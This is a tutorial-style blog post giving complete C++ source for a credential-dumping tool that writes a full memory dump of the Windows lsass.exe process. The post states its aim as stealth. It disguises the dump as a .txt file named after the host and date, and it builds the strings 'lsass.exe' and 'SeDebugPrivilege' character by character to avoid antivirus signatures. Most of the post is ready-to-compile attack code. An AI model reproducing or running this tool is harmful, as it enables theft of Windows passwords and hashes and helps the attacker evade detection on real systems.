---
layout: post
title: Customizing Lsass dumps with C++
excerpt_separator: <!--more-->
---

Dumping the Lsass process to get the passwords stored in memory in a Windows machine is one of the most common uses of Mimikatz. However, there are stealthier methods to do this, such as using custom code. Doing so, we can customize the dump file name, using the hostname and date as name and harmless extensions such as ".txt" instead of ".dmp".

<!--more-->


## Goal

We will use C++ to create a program that dumps the lsass.exe process in the stealthier way we can.  

Without input arguments it creates a dump file with the hostname and date as name and the ".txt" extension (*hostname_DD-MM-YYYY-HHMM.txt*). With input arguments it will use the first one as path for the file.  

To try to be stealthier, we will not use the "lsass" or "SeDebugPrivilege" strings and will try not to use the "minidump" string when possible. The final program is in [this link](https://github.com/ricardojoserf/LsassDumper).

<br>

# Code

To reach our goal, we will create a code that will:

- Check we are running an elevated process
- Get the lsass.exe PID
- Generate the file name or get it from the input arguments
- Create the output file with the correct name
- Enable the SeDebugPrivilege privilege
- Get a handle to the lsass.exe process
- Dump the process



## Main function

First we need to check if the process is running with administrative privileges, as it will not work otherwise. We will do this with the function IsElevatedProcess():

```cpp
if (!IsElevatedProcess()) {
	wcout << "[-] Error: Execute with administrative privileges." << endl;
	return 1;
}
```

Then, as we are in an elevated process, we can retrieve the lsass.exe process ID with the function getProcessPid():

```cpp
DWORD processPID = getProcessPid();
wcout << "[+] Process PID: " << processPID << endl;
```

We will then generate a name for the dump file we will create, and also a pointer to it.
- If there is an input argument with a file name, we will use that
- If not, we will generate a file name using the hostname and date.
	- Format: hostname_DD-MM-YYYY-HHMM (for example, hostname_01-12-2021-1200)

```cpp
string filename;
if (argc >= 2) {
	filename = argv[1];
}
else {
	string hostname = getHostname();
	filename = getFileName(hostname);
}
std::wstring stemp = std::wstring(filename.begin(), filename.end());
LPCWSTR pointer_filename = stemp.c_str();
```

With that dump file name, we will create the file (or overwrite it if it already exists!) with the function [CreateFile()](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea):

```cpp
HANDLE outFile = CreateFile(pointer_filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
```

Then, we will enable SeDebugPrivilege privilege with the function SetPrivilege(), needed to dump the lsass.exe process. If not possible we will halt the program:

```cpp
BOOL privAdded = SetPrivilege();
if (!privAdded) {
	wcout << "[-] Error: Necessary privilege could not be added." << endl;
	return 1;
}
```

We will create a handle to the process with the function [OpenProcess()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) and the minimum process rights we need: PROCESS_VM_READ and PROCESS_QUERY_INFORMATION. It would also work with PROCESS_ALL_ACCESS, but it is not necessary:

```cpp
DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
HANDLE processHandle = OpenProcess(processRights, 0, processPID);
```

Finally, we will dump the process. From [this link](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type), we can find that *MiniDumpWithFullMemory*, the type of dump we want, translates to the value 0x00000002. Hopefully using that value makes this stealthier. We will use that value, the process handle and PID and the output file and feed it to the function [MiniDumpWriteDump()](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump), which will do the work:

```cpp
BOOL isDumped = MiniDumpWriteDump(processHandle, processPID, outFile, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
if (isDumped) {
	cout << "[+] Successfully dumped process with pid " << processPID << " to file " << filename << endl;
}
```

<br>

## Other functions

#### Check Elevated Process 

For checking if the program is running as an elevated process we will use the following function ([source](https://stackoverflow.com/questions/11491933/openprocess-returns-null-every-time-in-c)):

```cpp
BOOL IsElevatedProcess()
{
	BOOL is_elevated = FALSE;
	HANDLE token = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
	{
		TOKEN_ELEVATION elevation;
		DWORD token_sz = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &token_sz))
		{
			is_elevated = elevation.TokenIsElevated;
		}
	}
	if (token)
	{
		CloseHandle(token);
	}
	return is_elevated;
}
```

<br>

#### Get Lsass Process ID

For getting the lsass.exe process ID (or PID) we will use the following function (based on this [code](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass)). To avoid using the string "lsass.exe" we will concatenate each letter of the string creating *processname_str*:

```cpp
DWORD getProcessPid()
{
	DWORD processPID = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";
	if (Process32First(snapshot, &processEntry)) {
		string str1 = "l";
		string str2 = ".";
		string str3 = "s";
		string str4 = "e";
		string str5 = "a";
		string str6 = "x";
		string processname_str = str1 + str3 + str5 + str3 + str3 + str2 + str4 + str6 + str4;
		std::wstring processname(processname_str.begin(), processname_str.end());
		const wchar_t* szName = processname.c_str();
		while (_wcsicmp(processName, szName) != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			processPID = processEntry.th32ProcessID;
		}
	}
	return processPID;
}
```

<br>

#### Set the SeDebugPrivilege privilege

To interact with the process we will need not only run the process with administrative privileges but also the SeDebugPrivilege privilege. For that, we will use the following method (based on [this snippet](https://www.unknowncheats.me/forum/1872353-post36.html)). To avoid using the string "SeDebugPrivilege" we will concatenate each letter of the string creating *privilegename_str*: 


```cpp
bool SetPrivilege()
{
	string str1 = "S";
	string str2 = "P";
	string str3 = "e";
	string str4 = "r";
	string str5 = "D";
	string str6 = "i";
	string str7 = "b";
	string str8 = "v";
	string str9 = "u";
	string str10 = "l";
	string str11 = "g";
	string privilegename_str = str1 + str3 + str5 + str3 + str7 + str9 + str11 + str2 + str4 + str6 + str8 + str6 + str10 + str3 + str11 + str3;
	std::wstring privilege_name(privilegename_str.begin(), privilegename_str.end());
	const wchar_t* privName = privilege_name.c_str();

	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
	HANDLE hToken = NULL;
	LUID luid = { 0,0 };
	BOOL Status = true;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		Status = false;
		goto EXIT;
	}
	if (!LookupPrivilegeValueW(0, privName, &luid))
	{
		Status = false;
		goto EXIT;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	if (!AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0))
	{
		Status = false;
		goto EXIT;
	}
EXIT:
	if (hToken)
		CloseHandle(hToken);
	return Status;
}
```

<br>

#### Create output file name

In case of not using input parameters, we will generate a file name with the format *hostname_DD-MM-YYYY-HHMM.txt*. For getting the hostname of the computer we will use the [GetComputerName](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea) method using the function getHostname()([source](https://www.youtube.com/watch?v=Z7ahuHV5eXY&ab_channel=RabieHammoud)):

```cpp
string getHostname() {
	TCHAR compname[UNCLEN + 1];
	DWORD compname_len = UNCLEN + 1;
	GetComputerName((TCHAR*)compname, &compname_len);
	wstring wstringcompname(&compname[0]);
	string stringcompname(wstringcompname.begin(), wstringcompname.end());
	return stringcompname;
}
```

Then we call the getFileName() function with the hostname to create the final file name. We create a string with the extension we will use and get the current time and store it in *timePtr*.

From [the documentation of the tm struct](https://www.cplusplus.com/reference/ctime/tm/) we get the fields we want, in this case the day (*tm_mday*), month (*tm_mon*, we add 1 because it represents the months from January from 0 to 11), year (*tm_year*, we add 1900 because it represents the years from that date), hour (*tm_hour*) and minutes (*tm_minutes*, we append a "0" in case it is less than 10).

To create the final string we will use a Stringstream, *filenamestream*, to concatenate the strings and integers. In case you want to customize the file name, this is the object you should change.


```cpp
string getFileName(string hostname) {
	string extension = ".txt";
	time_t t = time(NULL);
	tm* timePtr = localtime(&t);	
	string minutes;
	if (timePtr->tm_min < 10) {
		minutes = "0" + std::to_string(timePtr->tm_min);
	}
	else {
		minutes = std::to_string(timePtr->tm_min);
	}
	stringstream filenamestream;
	string filename;
	filenamestream << hostname;
	filenamestream << "_";
	filenamestream << timePtr->tm_mday;
	filenamestream << "-";
	filenamestream << timePtr->tm_mon + 1;
	filenamestream << "-";
	filenamestream << timePtr->tm_year + 1900;
	filenamestream << "-";
	filenamestream << timePtr->tm_hour;
	filenamestream << minutes;
	filenamestream << extension;
	filenamestream >> filename;
	return filename;
}
```

<br>

## Final script

The resulting script (which can be found also in [this Github repo](https://github.com/ricardojoserf/LsassDumper)) is:

```cpp
#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma warning(disable : 4996)
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <sstream>
#define UNCLEN 512
using namespace std;


BOOL IsElevatedProcess()
{
	BOOL is_elevated = FALSE;
	HANDLE token = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
	{
		TOKEN_ELEVATION elevation;
		DWORD token_sz = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &token_sz))
		{
			is_elevated = elevation.TokenIsElevated;
		}
	}
	if (token)
	{
		CloseHandle(token);
	}
	return is_elevated;
}


DWORD getProcessPid()
{
	DWORD processPID = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";
	if (Process32First(snapshot, &processEntry)) {
		string str1 = "l";
		string str2 = ".";
		string str3 = "s";
		string str4 = "e";
		string str5 = "a";
		string str6 = "x";
		string processname_str = str1 + str3 + str5 + str3 + str3 + str2 + str4 + str6 + str4;
		std::wstring processname(processname_str.begin(), processname_str.end());
		const wchar_t* szName = processname.c_str();
		while (_wcsicmp(processName, szName) != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			processPID = processEntry.th32ProcessID;
		}
	}
	return processPID;
}


bool SetPrivilege()
{
	// Generate privilege name object
	string str1 = "S";
	string str2 = "P";
	string str3 = "e";
	string str4 = "r";
	string str5 = "D";
	string str6 = "i";
	string str7 = "b";
	string str8 = "v";
	string str9 = "u";
	string str10 = "l";
	string str11 = "g";
	string privilegename_str = str1 + str3 + str5 + str3 + str7 + str9 + str11 + str2 + str4 + str6 + str8 + str6 + str10 + str3 + str11 + str3;
	std::wstring privilege_name(privilegename_str.begin(), privilegename_str.end());
	const wchar_t* privName = privilege_name.c_str();
	// Adjust token privileges
	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
	HANDLE hToken = NULL;
	LUID luid = { 0,0 };
	BOOL Status = true;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		Status = false;
		goto EXIT;
	}
	if (!LookupPrivilegeValueW(0, privName, &luid))
	{
		Status = false;
		goto EXIT;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	if (!AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0))
	{
		Status = false;
		goto EXIT;
	}
EXIT:
	if (hToken)
		CloseHandle(hToken);
	return Status;
}


string getHostname() {
	TCHAR compname[UNCLEN + 1];
	DWORD compname_len = UNCLEN + 1;
	GetComputerName((TCHAR*)compname, &compname_len);
	wstring wstringcompname(&compname[0]);
	string stringcompname(wstringcompname.begin(), wstringcompname.end());
	return stringcompname;
}


string getFileName(string hostname) {
	// Extension of the file
	string extension = ".txt";
	// Get time
	time_t t = time(NULL);
	tm* timePtr = localtime(&t);
	// Create filename. Format: hostname_01-12-2021-1200
	string minutes;
	if (timePtr->tm_min < 10) {
		minutes = "0" + std::to_string(timePtr->tm_min);
	}
	else {
		minutes = std::to_string(timePtr->tm_min);
	}
	stringstream filenamestream;
	string filename;
	filenamestream << hostname;
	filenamestream << "_";
	filenamestream << timePtr->tm_mday;
	filenamestream << "-";
	filenamestream << timePtr->tm_mon + 1;
	filenamestream << "-";
	filenamestream << timePtr->tm_year + 1900;
	filenamestream << "-";
	filenamestream << timePtr->tm_hour;
	filenamestream << minutes;
	filenamestream << extension;
	filenamestream >> filename;
	return filename;
}


int main(int argc, char** argv) {
	// Check elevated process
	if (!IsElevatedProcess()) {
		wcout << "[-] Error: Execute with administrative privileges." << endl;
		return 1;
	}

	// Get process PID
	DWORD processPID = getProcessPid();
	wcout << "[+] Process PID: " << processPID << endl;

	string filename;
	if (argc >= 2) {
		// Use custom name from first input argument to create name for dump file...
		filename = argv[1];
	}
	else {
		// ... or generate file name with hostname and date
		string hostname = getHostname();
		filename = getFileName(hostname);
	}
	std::wstring stemp = std::wstring(filename.begin(), filename.end());
	LPCWSTR pointer_filename = stemp.c_str();

	// Create output file
	HANDLE outFile = CreateFile(pointer_filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Enable SeDebugPrivilege privilege
	BOOL privAdded = SetPrivilege();
	if (!privAdded) {
		wcout << "[-] Error: Necessary privilege could not be added." << endl;
		return 1;
	}

	// Create handle to the process
	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
	HANDLE processHandle = OpenProcess(processRights, 0, processPID);

	// Dump process
	if (processHandle && processHandle != INVALID_HANDLE_VALUE) {
		wcout << "[+] Handle to process created correctly." << endl;
		BOOL isDumped = MiniDumpWriteDump(processHandle, processPID, outFile, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
		if (isDumped) {
			cout << "[+] Successfully dumped process with pid " << processPID << " to file " << filename << endl;
		}
		else {
			cout << "[-] Error: Process not dumped." << endl;
			return 1;
		}
	}
	else {
		wcout << "[-] Error: Handle to process is NULL." << endl;
		return 1;
	}

	return 0;
}
```
